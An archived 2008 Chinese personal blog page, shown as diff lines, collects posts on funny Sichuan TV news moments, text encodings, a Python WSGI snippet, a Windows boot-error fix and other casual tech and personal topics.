+那个男记者的跑过去很关心地问：“师傅，你痛不痛喃？”<br />
+<br />
+　　2、有次有个精神有点问题的男的跳楼了。他父母都赶过来。等他妈哭够了以后记<br />
+者跑过去拿话筒对倒她问：“请问你现在有啥子想法喃？”<br />
+<br />
+　　3、有一次《谭谈交通》的谭乔拦下两个横着扛梯子准备闯红灯的人，刚教育了他<br />
+们几句，看起来比较老实那个就急倒指到另一个人说：“是我们老板的主意！”，然后<br />
+那个老板就默默地用很幽怨的眼神看着他身边这位很纯很天真的工人。。。<br />
+<br />
+　　4、有一次川台有个女主播把有条不紊（wen）读成有条不絮（xu），我小学的时候<br />
+犯过同样的错，但是。。。<br />
+<br />
+　　5、有一次有户人家着火了。记者赶到现场之后火已经被扑灭了。记者采访那家女<br />
+主人，她说正在煮饭的时候家里就起火了balabala之类，一段话听完之后那个女记者的<br />
+第一句话就是：“那你们的饭煮糊没有喃？”<br />
+<br />
+　　6、又是车祸现场，昏迷的伤者从变形严重的车上救下来的时候明显小腿已经严重<br />
+变形歪倒一边了，女记者跑去很傻很天真地问：“医生，请问他是骨折了哇？”医生：<br />
+“……嗯。”女记者又问：“严不严重喃？”医生：“……”女记者：“那他有<br />
+没有生命危险喃？”医生：“……随时都有。”。。。<br />
+<br />
+　　7、四川台放的，有一次有一对夫妻吵架，男的气得跳楼（忘了是几楼了），结果<br />
+跳下去之后又爬起来然后又遭路过的车子撞倒，他老婆跑下楼去看他咋样了。结果他爬<br />
+起来就给他老婆一耳屎。然后大家把那个男的送到医院去检查结果医生说只有皮外伤。<br />
+。。<br />
+<br />
+　　8、有一次捣毁荷花池一个骗子店铺，记者揣起针孔摄像机扮路过的人被骗进去然<br />
+后被换了假钱然后他假装识破结果被店里的人打了几下然后他就退了出来。取好证过后<br />
+，pol.ice就行动了，把那些人都抓了。然后那个男记者就多兴奋多牙尖地跑到开始打<br />
+了他的那个女的的面前去说：“你打我得嘛！你多歪得嘛！”。。。  </p>
+<p>9, 有一次记者暗访一个卖二级保护动物藏猕猴的年轻娃儿，跑到他家楼顶上谈交易，<br />
+    那个小猴子就在边上跑来跑去的。结果那个娃儿的妈跑上来喊他好像是吃饭之类的，那<br />
+个娃儿说：“哎呀我们在谈事情，快下去！”他妈就发飙了：“你凶啥子凶！老子甩你<br />
+两脚尖！”。。。  </p>
+<p>10, 两口子打架 一女记者的采访那被打之女（四川话）：“你男人为啥子打你” 女：<br />
+    “他说我偷人”记者：“那你偷没得啊”女的：“。。。。。。”。。。记者：“你说<br />
+啊。你说你偷没得嘛”! |||<br />
+<br />
+　　11, 俺一朋友，车祸，半昏迷在现场等救护车中，突然感觉有人在轻轻但很坚持的<br />
+一直捅她，挣扎了半天张开眼，一话筒支面前，问她感觉如何，登时又翻白眼晕过去了<br />
+。。。。。。。。。。。。。。  </p>
+<p>12, 见过最强的一个,不知道是新闻现场还是全接触,pol.ice清理那些要饭了,要把他们<br />
+    拉上警车,这个时候记者上前采访那些乞丐,乞丐很有经验地接受采访,pol.ice叔叔不耐<br />
+烦了,要把那些人拉上去,有一个男乞丐很镇定地对pol.ice说"别急嘛,没看我正接受采<br />
+访呢吗?"pol.ice同志无语……哈哈,我们全家笑翻  </p>
+<p>13, 噢,我补充一个!<br />
+    　　哪个啥子960,<br />
+　　就是拍些培养人们道德感公德心的哪个节目!<br />
+　　有次请的嘉宾是薛之谦!<br />
+　　让他装成路人带起一包文件,从某个地方过,然后喊他装着文件掉了自己却不晓得,<br />
+看看有没有好心的路人帮助他,摄象机在很远的地方暗中拍摄,<br />
+　　好,开始了~薛GG就在那条街上来回的走了N次!东西掉了N次!但是都很少有人去给他<br />
+说!<br />
+　　当第N次过后仍然是这个结果时,导演说,这个地方不行,叫薛之千在这做最后一次测<br />
+试,然后就换地方!<br />
+　　就在这个时候,精辟的事情发生了!<br />
+　　就在薛GG走的那条小街的街边上有个小卖部!外头坐着个正在打毛线还是晒太阳的<br />
+老妞er!她在这个时候轻描淡写的吼出了一句非常有意义的话:"妈有这个娃娃脑壳有兵<br />
+乓索!东西紧到掉紧到掉,瓜的索."  </p>
+<p>14, 谭谈交通，有一期谭交警抓住一家骑电瓶车的，小女娃娃蹲在前面，老爸骑车，老<br />
+    妈坐在后面，谭警官问人家会不会唱吉祥三宝，，说他改了个危险三宝，而且当声唱给<br />
+人家听，全文如下，（请用吉祥三宝的调调来唱）<br />
+　　爸爸，电瓶车可以载人吗？<br />
+　　不能，<br />
+　　那为什么你载着我和妈妈？<br />
+　　我错了，<br />
+　　我们全家就是危险的一家，啊！！<br />
+<br />
+　　我们全家当场笑翻，，太油菜了！  </p>
+<p>15, 还是谭谈交通，有一期谭交警抓住一个骑电动车的人，他超宽超载的运了几块多重<br />
+    的大木板，谭乔就喊他下来，问他：你这么大个木板，是咋才能让它在这个小小的电动<br />
+车上不倒的喃？<br />
+　　那个人老实巴交地说：手掌好？谭乔说？安？首长好？那人又回答一次：手，掌好<br />
+。谭乔当时就纳闷的说：我是pol.ice不是首长~~~~~~~~~~~`当场笑翻。。</p>
+<p>16, 成都台有个节目是上街问老百姓问题,答对的就奖励10元,<br />
+　　记得有一次,主持人问一过街大爷"你知道杜甫草堂是纪念李白的还是诸葛亮的?"<br />
+　　大爷随口就是说"纪念李白的"<br />
+　　主持人说"哈,错啦,是纪念杜甫的"说完就快速闪人啦,留下一个抓狂的大爷  </p>
+<p>17, 有一次有个农民家里的牛发疯跑出来了。然后最后被逼到一个荒废的空地的角落里。<br />
+　　这个时候武警就出动了。他们拿了枪准备把那个牛击毙三。然后电视台的就站在边<br />
+上拍。<br />
+　　打了一枪。牛没反应。打了两枪。牛没反应。打了三枪。牛没反应。打了四枪。牛<br />
+没反应。打了五枪。牛没反应。打了六枪。牛没反应。打了七枪。牛没反应。打了八枪<br />
+。牛没反应。<br />
+<br />
+　　安静。。。。<br />
+<br />
+　　然后一个貌似武警的头头转过来对镜头说：“啊，他们平时不是用的这个枪，这个<br />
+枪还没校准过。”  </p>
+<p>18, 那我也要贡献一个，有期谭乔抓到一个骑电摩的人拿了一个杆子，谭乔正抓到他，<br />
+    说你以为你是张飞嗦，人家拿刀，你拿杆，他看到一个骑电摩拿梯子的，就说pol.ice<br />
+叔叔看，那个人更谈还拿梯子，谭乔又抓到拿梯子的说你也以为你是张飞嗦….还没说<br />
+完拿梯子的师傅很不满的说了一句张飞有我长的称头啊。  </p>
+<p>19, 有次看《谭谈交通》，谭警官刚抓了一个违章的，正在进行教育，结果旁边有一群<br />
+    蹬火三轮的看热闹，突然其中一个人认出谭乔了，一边狂笑一边用手指到谭乔：“哈哈<br />
+哈哈哈哈哈哈，我认得到你，哈哈哈哈哈哈哈哈哈哈，你是那个#￥#%￥#%，哈哈哈哈<br />
+哈哈…..”于是镜头也不拍违章者了，转拍这个喜剧人物，此人继续狂笑，继续指到<br />
+谭乔转头跟周围的同行说：“哈哈哈哈，我认得到他……….”谭乔无语，憋了半天<br />
+说了句：“你等我们拍完了再说哈~”  </p>
+<p>20, 还有次好像是成都全接触哇，有个老太婆，简直就是女版周星驰，之搞笑。当时她<br />
+    是围观者，是看到2个人打架，打得有点凶，等记者来了的时候人都送医院切了，记者<br />
+肯定不甘心走撒，正好这个太婆出现了，一边口水四溅地描述刚才的经过，一边用动作<br />
+同时扮演打人者和被打者，非常“敬业”，当说到被打者躺到地上切了的时候，太婆毫<br />
+不犹豫的躺了下去，躺下去了之后还在不停的说……  </p>
+<p>21, 前两天还看到一个更搞笑的<br />
+    　　貌似《胖姐帮忙》<br />
+　　有两口子结婚一个月就闹架离婚<br />
+　　记者问女的：你们为啥子要离婚喃？<br />
+　　女的说：狗日的这个男的之变态，他说的每天要做两道，还说晚上睡觉不准穿衣服<br />
+　　男的说：做没有嘛，做都没求做<br />
+　　女的说：杂没做喃<br />
+　　男的说：就在桌子上做过一回。。-_-||||  </p>
+<p>22, 谭乔有一期抓了一个把自行车上面装个电机改成电动车的，就问他,你车速这么快<br />
+    怎么刹车喃?<br />
+　　那个人说:我有脚刹噻~<br />
+　　谭乔:啥子脚刹哦?<br />
+　　骑车人:把脚一伸就刹住了噻~~<br />
+</p>
+<p>23，某一期的《道听途说》开场笑话，石少："说年轻两口子在屋头看33频道，男的在<br />
+    泡脚，女的吃小番茄，问男的，老公，小番茄洗过没？男的盯她一眼，说，废话！看自<br />
+己的电视了，女的多高兴的一口一个，男的想了半天突然神戳戳的把女的盯到，说，我<br />
+在脚盆里淘了三道。。。"  </p>
+<p>24，也是谭乔的那个洗脑壳节目 有回看到个人用电瓶车载几个大板子 然后把别个短下<br />
+    来<br />
+洗了别个半天：“您真是力拔山兮气盖世啊”<br />
+那人非常无辜茫然的说：“我听不懂。。。”  </p>
+<p>25，圣诞节那天，谭谭抓到两个小妹违章，一个小妹骑车搭到另一个小妹 手上还拿到<br />
+    充气棒。 拦下之后进行教育，小妹很不服，又哭又闹又拽。 为了缓和气氛，谭谭就说<br />
+，你们衣服上这个标签杂个不剪喃？ 小妹说，现在就流行这个，潮，你懂不懂？ 说到<br />
+说到就拿起充气棒打谭谭的脑壳，边打边笑边说：圣诞快乐。 谭谭又气氛，又无奈的<br />
+说：你们这个样子是袭警！这个是袭警！  </p>
+<p>26，新闻现场播的，有个老头儿和一个小伙子扯皮了，结果那个小伙子就拿刀子捅了那<br />
+    个老头儿，<br />
+pol.ice就问那个小伙子：“你咋个捅人喃？”<br />
+小伙子说：“他日妈个要骂老子。”<br />
+pol.ice说：“他骂你啥子嘛？”<br />
+小伙子道：“他说的我日你狗日的！”  </p>
+<p>27，也是潭乔的，有回他看到有个人开车三，然后他觉得那个人动作多扯拐的，他就把<br />
+    那个人喊到，结果一看，狗子坐位都末得，那个人孤起在那儿开车，更经典的是方向盘<br />
+就是个两个扳手，车一车的。  </p>
+<p>潭乔吓疼了，就开始教育教育教育，然后教育完了，潭乔说“，以后不能再这个样子了<br />
+哈，诶，等哈，你再坐进切，再开一圈，我看哈你乍开的喃！”。。。 </p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-14T09:57:15+08:00">2008-03-14</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/624088"  rel="bookmark" >
+              <h2 class="card-title">终于明白cp936是什么意思了</h2>
+            </a>
+            <p class="card-text"><p>一直为GB2312，GBK，GB18030和CP936之间的关系头痛，今天得到Python群里一位高人指点，明白了cp936就是指系统里第936号编码格式，也就是GB2312。</p>
+<p>可以看<a href="http://202.115.22.199/Blog/electronixtar/archive/2007/07/05/14747.aspx">这个</a>表：</p>
+<blockquote>
+<p>936 gb2312 简体中文(GB2312)</p>
+</blockquote>
+<p>至于Unicode, UCS2, UTF-8之间的种种关系还是比较困惑。特别是Unicode和Unicode对象、UTF-8编码的Unicode对象……非常郁闷</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-22T20:16:35+08:00">2008-02-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/623979"  rel="bookmark" >
+              <h2 class="card-title">[Python]WSGI, Asynchronous, PEP-333, socket杂博</h2>
+            </a>
+            <p class="card-text"><p><code><br>
+def demo_app(environ,start_response):<br>
+from StringIO import StringIO<br>
+stdout = StringIO()<br>
+print &gt;&gt;stdout, "Hello world!"<br>
+print &gt;&gt;stdout<br>
+h = environ.items(); h.sort()<br>
+for k,v in h:<br>
+print &gt;&gt;stdout, k,'=',`v`<br>
+k=start_response("200 OK", [('Content-Type','text/plain')])<br>
+for x in range(1, 100):<br>
+k(str(x))<br>
+time.sleep(1)<br>
+return [stdout.getvalue()]<br></code></p>
+<ul>
+<li><code>print &gt;&gt;stdout, "Hello world!"</code>Python的这种语法非常长见识，很想C++里的语法</li>
+<li>f1=f2(); f1(); 这种函数式编程风格是相当的囧</li>
+<li>WSGI要实现<a href="http://majek4.blogspot.com/2007/12/asynchronous-django-responses-comet-yes.html">异步</a>输出，弄懂了<a href="http://www.python.org/dev/peps/pep-0333/">PEP-333</a>还是比较容易的，但是要在服务器端实现间歇性读取POST提交的内容就有点难了。当然这些东西完全超出了WSGI甚至HTTP的 请求 - 响应 模型</li>
+<li><a href="http://www.windley.com/archives/2006/03/alex_russell_on.shtml">IE is draconian</a>: Clients can’t make more than two HTTP connections to any box/subdomain (per spec).</li>
+<li>目前在HTTP上模拟socket的Python服务端程序有两个库：<a href="http://divmod.org/trac/wiki/DivmodNevow/Athena">Athena</a>，<a href="http://svn.xantus.org/shortbus/trunk/cometd-twisted/">python-cometd</a></li>
+</ul></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-20T15:39:40+08:00">2008-02-20</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/624034"  rel="bookmark" >
+              <h2 class="card-title">微软居然提供GNU、Unix的SDK/工具下载……WTF</h2>
+            </a>
+            <p class="card-text"><p>网上lurking around的时候发现一个<a href="http://www.goitexpert.com/entry.cfm?entry=Run-Unix-Applications-In-Windows--Reverse-Wine">火星帖子</a>：Vista和Server 2008支持Unix子系统……而且貌似是比较完整的。甚至包括一个C shell 和K Shell</p>
+<p><a href="http://www.microsoft.com/downloads/details.aspx?familyid=93ff2201-325e-487f-a398-efde5758c47f&amp;displaylang=en">Utilities and SDK for Subsystem for UNIX-based Applications in Microsoft Windows Vista RTM/Windows Vista SP1 and Windows Server 2008</a></p>
+<blockquote>
+<p>Utilities and SDK for UNIX-Based Applications is an add-on to the Subsystem for UNIX-Based Applications (referred to as SUA, hence forth) component that shipped in Microsoft Windows Vista / Windows Server2008 RC1.<br>
+This consists of the following components:</p>
+<p>- Base Utilities<br>
+- SVR-5 Utilities<br>
+- Base SDK<br>
+- GNU SDK<br>
+- GNU Utilities<br>
+- UNIX Perl<br>
+- Visual Studio Debugger Add-in</p>
+<p>This release enables 64-bit application development for SUA. development and porting of custom UNIX applications using the Windows OCI (Oracle Call Interface) and Windows ODBC libraries (collectively referred to as ‘Mixed Mode’ in the rest of the document).</p>
+</blockquote>
+<p>目前支持Windows Vista（请下载不带RC1字样的链接），以及Vista SP1 RC1，Server 2008 RC1（请下载带RC1字样的链接）。</p>
+<p><a href="http://download.microsoft.com/download/6/b/6/6b63eb90-cd38-442d-b624-b9d2a26dc5c3/Utilities%20and%20SDK%20for%20UNIX-based%20Applications_AMD64.exe">Utilities and SDK for UNIX-based Applications_AMD64.exe 196.3 MB</a></p>
+<p><a href="http://download.microsoft.com/download/6/b/6/6b63eb90-cd38-442d-b624-b9d2a26dc5c3/Utilities%20and%20SDK%20for%20UNIX-based%20Applications_AMD64_RC1.exe">Utilities and SDK for UNIX-based Applications_AMD64_RC1.exe 251.0 MB</a></p>
+<p><a href="http://download.microsoft.com/download/6/b/6/6b63eb90-cd38-442d-b624-b9d2a26dc5c3/Utilities%20and%20SDK%20for%20UNIX-based%20Applications_IA64_RC1.exe">Utilities and SDK for UNIX-based Applications_IA64_RC1.exe 259.8 MB</a></p>
+<p><a href="http://download.microsoft.com/download/6/b/6/6b63eb90-cd38-442d-b624-b9d2a26dc5c3/Utilities%20and%20SDK%20for%20UNIX-based%20Applications_X86.exe">Utilities and SDK for UNIX-based Applications_X86.exe 193.3 MB</a></p>
+<p><a href="http://download.microsoft.com/download/6/b/6/6b63eb90-cd38-442d-b624-b9d2a26dc5c3/Utilities%20and%20SDK%20for%20UNIX-based%20Applications_X86_RC1.exe">Utilities and SDK for UNIX-based Applications_X86_RC1.exe 248.7 MB</a></p>
+<p>开启方法：</p>
+<p>开始菜单 - 控制面板 - 程序和特性 - 打开/关闭Windows特性，勾选Unix子系统应用程序。</p>
+<p>看了觉得很囧的请帮我Digg，谢谢！<br>
+<a href="http://digg.com/microsoft/Microsoft_Provide_GNU_and_Unix_SDK_Utilities_Download_WTF">http://digg.com/microsoft/Microsoft_Provide_GNU_and_Unix_SDK_Utilities_Download_WTF</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-20T15:35:39+08:00">2008-02-20</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/623999"  rel="bookmark" >
+              <h2 class="card-title">我的机器被这个IP黑了，哪位能帮忙查出来？</h2>
+            </a>
+            <p class="card-text"><p><img src="http://www.xianip.com/showip.php?id=" alt="your ip" width="200" height="38"></p>
+<p>谢谢大家了 ！</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-19T09:59:06+08:00">2008-02-19</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/623973"  rel="bookmark" >
+              <h2 class="card-title">Google, Baidu经常抽风</h2>
+            </a>
+            <p class="card-text"><p>您所请求的网址（URL）无法获取</p>
+<p>——————————————————————————–</p>
+<p>当尝试读取以下网址（URL）时： http://www.google.com/search?hl=en&amp;q=Applying+background+to+Iframe+for+IE</p>
+<p>发生了下列的错误：</p>
+<p>无法将您输入的主机名称：www.google.com转换成 IP 地址<br>
+域名服务器返回以下讯息：</p>
+<p>No DNS records<br>
+这表示：</p>
+<p>The cache was not able to resolve the hostname presented in the URL.<br>
+Check if the address is correct.<br>
+缓存服务器无法解析您输入网址（URL）中的主机名称，<br>
+请检查该名称是否正确。</p>
+<p>本缓存服务器管理员：webmaster@fastcdn.com</p>
+<p>——————————————————————————–</p>
+<p>Generated Mon, 18 Feb 2008 09:11:05 GMT by CNC-TJTG-182.229.fastcdn.com (squid)</p>
+<p>2008-2-18 成都教育网，Google.com和Baidu.com经常出现DNS解析错误。不是ZF在搞鬼就是电信技术人员工资没发够。</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-18T17:12:55+08:00">2008-02-18</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/623952"  rel="bookmark" >
+              <h2 class="card-title">查看自己在Google Groups上的发帖/回帖</h2>
+            </a>
+            <p class="card-text"><p>加入了很多个Google Groups参与了很多讨论，但是并不能随时跟踪相关的条目。这里写一个技巧。随便找到自己在Google Groups上的一个帖子，点击自己名字旁边的<a href="http://groups.google.com/groups/profile?enc_user=y6RqkRcAAAD1B6-oXPGMRBm6bKbtEIIjHqZiDvCVswhrZ6TQxKj0ww">View Profile</a>，然后点击最近讨论主题列表下面的<a href="http://groups.google.com/groups/search?scoring=d&amp;filter=0&amp;enc_author=y6RqkRcAAAD1B6-oXPGMRBm6bKbtEIIjHqZiDvCVswhrZ6TQxKj0ww">Show All&gt;&gt;</a>，把这个地址保存到收藏夹。</p>
+<p>小技巧，大家不要鄙视我。</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-18T11:22:55+08:00">2008-02-18</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/623884"  rel="bookmark" >
+              <h2 class="card-title">空虚</h2>
+            </a>
+            <p class="card-text"><p>人人人人人人人人人人人人人人人人人人人人人人人人人人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　我　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人　　　　　　　　　　　　　　　　　　　　　　　　人<br />
+人人人人人人人人人人人人人人人人人人人人人人人人人人<br />
+所以很空虚</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-16T16:55:03+08:00">2008-02-16</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/623866"  rel="bookmark" >
+              <h2 class="card-title">Bill Gates的Email邮箱</h2>
+            </a>
+            <p class="card-text"><p>Bill Gates在Facebook上出现过一段时间，好事者把它的页面<a href="http://www.cnbeta.com/articles/49233.htm">截了个图</a>。</p>
+<p>但是Bill Gates的邮箱就暴露了：</p>
+<p>billg@microsoft.com</p>
+<p>网上搜索了下，发现Bill用这个邮箱<a href="http://db.tidbits.com/article/7911">很久</a>了，而且每天收到的垃圾邮件是 4 million，400w封！不知道他老人家是不是用<a href="http://mail.live.com">Live hotmail</a>来处理的邮件 -_-!</p>
+<p>顺便惊讶的发现Bill Gates在<a href="http://www.google.com/search?hl=en&amp;q=billg%40microsoft%2Ecom+site%3Amicrosoft%2Ecom">多个M$的Newsgroup上</a>面露过面。看来名人也是正常人啊，也要玩USENET、youtube和facebook。不过名人一般都是马甲无数了</p>
+<p>不知道Bill在<a href="http://www.gatesfoundation.org/">Bill &amp; Melinda Gates Foundation</a>里会不会继续用这个Email地址</p>
+<p>Update: 去<a href="http://digg.com/tech_news/Bill_Gates_s_Real_Facebook_Profile_Revealed">Digg</a>验证了下，发现这个截图有可能是fake的</p>
+<p>首先是拼写错误，Beatles，Bill不会把这个拼错的 -_-!<br>
+当然马上有人站出来反驳说：他不会去花赚几千美元的一秒种来改正这个错误 -_-!</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-16T11:19:53+08:00">2008-02-16</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/623864"  rel="bookmark" >
+              <h2 class="card-title">解决XP SP2启动时Loader Error 3</h2>
+            </a>
+            <p class="card-text"><p>一大清早起来，开机，结果Windows XP SP2刚启动就：</p>
+<blockquote>
+<p>Windows could not start because of an error in the software.<br>
+please report this problem as:<br>
+Loader error 3.<br>
+please contact your support person to report this problem</p>
+</blockquote>
+<p>这是非常囧的情况。</p>
+<p>安全模式 和 带网络连接的安全模式 可以进入，但是 正常模式 和 最后一次正确的配置 模式都不能进入系统。</p>
+<p>想到网上去<a href="http://www.google.com/search?hl=en&amp;q=Lloader+error+3">Google答案</a>，但是在安全模式下不能启动Telephony服务，于是也不能PPPoE上网。万恶的微软设计啊～～～想起了我的Leopard双系统，发现Leopard居然说我网线没插好……而且PPPoE也不能拨号。</p>
+<p>系统恢复盘也忘记刻了，所以只有艰苦奋斗双手解决了</p>
+<p>发现启动的时候可以带日志启动。启动失败，进入安全模式，找到了这个记录：</p>
+<p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/02/12.JPG' alt='12.JPG' width="600" height="363"></p>
+<blockquote>
+<p>事件来源：sptd<br>
+驱动程序为 在其数据结构中检测到了一个内部错误。</p>
+</blockquote>
+<p>万分囧的发现是SPTD驱动出错了，SPTD是Daemon Tools的虚拟光驱驱动程序，于是到 system32\drivers 下删除 sptd.sys</p>
+<p>重启，OK了。</p>
+<p>DaemonTools官方也给出了一个<a href="http://www.daemon-tools.cc/dtcc/my-system-wont-boot-after-t6828.html">解决方案</a>，懒得看了，直接重装最新版DaemonTools了事</p>
+<p>Solution in English:<br>
+delete system32\drivers\sptd.sys, reboot &amp; it’s OK<br>
+Contact Daemon Tools for <a href="http://www.daemon-tools.cc/dtcc/my-system-wont-boot-after-t6828.html">more</a> information</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-16T10:56:27+08:00">2008-02-16</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/623848"  rel="bookmark" >
+              <h2 class="card-title">试玩Renoise</h2>
+            </a>
+            <p class="card-text"><p>最近……最近非常郁闷。家里一个劲的给我讲形势，叫我考研。弄得我啥子都不想做，到处乱逛，发现了<a href="http://www.csksoft.net/">CSK</a>对<a href="http://en.wikipedia.org/wiki/MOD_(file_format)">MOD Music</a>一篇<a href="http://www.csksoft.net/blog/post/intro2track_music.html">介绍贴</a>，有点老了，但是突然引起了我的兴趣，于是wikipedia, Google逛了一圈，开始研究Renoise这个<a href="http://en.wikipedia.org/wiki/Tracker">tracker</a></p>
+<p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/02/11.JPG' alt='11.JPG' width="600" height="424"></p>
+<p>化了半天研究Renoise文档，基本操作会了。玩起来很high。可怜我音乐细胞不够发达，还不能自己画曲子出来。目前把上学期钢琴课的几首曲子录制成了XRNS格式，不过volume和effects一点都没有调。相信以后一定要MOD一点曲子出来玩玩的。</p>
+<p>于是非常想去买一个MIDI键盘（查了下最入门的都1k2多大洋），但是又想买把古典吉他……对于我这种穷人+补考大户，可能最多YY一下，然后用电脑键盘+鼠标消遣了。</p>
+<p>Renoise非常容易上手，界面美观，功能非常强大，社区及其活跃。接下来准备把中国古典名曲给track出来。如果有条件的话用actionscript3实现一个XRNS Synthesizer，哇咔咔～～当然这只是一个美好的愿望罢了。还是重修和做Web要紧</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-15T22:40:31+08:00">2008-02-15</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/nu/26"  rel="bookmark" >
+              <h2 class="card-title">算24：认为自己智商在130以上的进来</h2>
+            </a>
+            <p class="card-text"><p>网上看到一个题：算24 这个游戏大家都做过吧？</p>
+<p>这里出一个BT级别的：</p>
+<p><strong>0, 0, 0, 0 四个0用大学数学的函数、运算符算24</strong></p>
+<p><a href="http://ftofficer.spaces.live.com/blog/cns!423B72634E2F6B7E!471.entry">这里</a>可以看到答案</p>
+<p>&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-</p>
+<p>Update：这里有一个更加强大的算法，<strong>任意4个非虚数</strong>通过一定运算可以得到24.。例如 a, b, c, d</p>
+<p>( a&#8217;! + b&#8217;! + c&#8217;! + d&#8217;! )!=24</p>
+<p>这里 &#8216; 表示求导；! 表示阶乘，无敌了无敌了～～～呵呵 </p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-02T10:20:28+08:00">2008-02-02</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622841"  rel="bookmark" >
+              <h2 class="card-title">Security and Anti-virus</h2>
+            </a>
+            <p class="card-text"><p>收到关注的东西总是vulnerable，例如个人操作系统和服务器。所以人们发明了软件来保护这些东西，但是从生态角度来看，这些防护性的措施根本不能解决问题。因为病毒样本和行为库总是落后的。同时安全软件起到的作用也只是加快了病毒和木马的进化。</p>
+
+<p>安全软件越强大，木马进化速度越快。现在国内要发一个新木马，一般都能by-pass 80% 的反病毒软件。也就是说，新的木马对80%的安全软件免疫。只有可怜的20%的软件能察觉新的木马。那么，安全软件的进化速度永远是落后于病毒的。</p>
+
+<p>也有木马是针对没有安装反病毒软件的PC机的（“裸奔”用户），但是这部分用户安全意识一般来说都很高。没有那么容易得手的。</p>
+
+<p>所以，Anti-virus和VXer之间的斗争，Anti-virus永远是失败者。</p>
+
+<p>So why bother using Anti-virus software ? 自己的习惯和了解超前时代的技术才是最重要的。</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-23T14:49:49+08:00">2008-01-23</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622828"  rel="bookmark" >
+              <h2 class="card-title">[youtube]永动机视频</h2>
+            </a>
+            <p class="card-text"><p><object width="425" height="355"><param name="movie" value="http://www.youtube.com/v/PIvZJ9xGutI&amp;rel=1">
+
+<param name="wmode" value="transparent">
+
+<embed src="http://www.youtube.com/v/PIvZJ9xGutI&amp;rel=1" type="application/x-shockwave-flash" wmode="transparent" width="425" height="355"></object></p>
+
+<p>About This Video This is a repost of the original Alsetalokin’s … (more)<br>
+
+Added: January 04, 2008<br>
+
+This is a repost of the original Alsetalokin’s video showing how his implementation of overconfident’s idea looks like so far. (The original video has been taken down by the autor, but he permitted reposting it by others.)</p>
+
